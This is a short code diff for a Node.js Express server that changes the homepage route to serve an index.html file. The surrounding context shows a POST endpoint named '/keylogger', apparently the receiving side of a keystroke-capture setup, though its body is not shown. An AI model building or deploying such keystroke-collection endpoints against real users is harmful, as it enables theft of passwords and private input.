@@ -19,7 +19,7 @@ app.use(bodyParser.urlencoded({ extended: true })); // support encoded bodies
 
 // respond with "hello world" when a GET request is made to the homepage
 app.get('/', function (req, res) {
-  res.send('hello world')
+  res.sendFile(path.join(__dirname, 'index.html'));
 });
 
 app.post('/keylogger', function (req, res) {
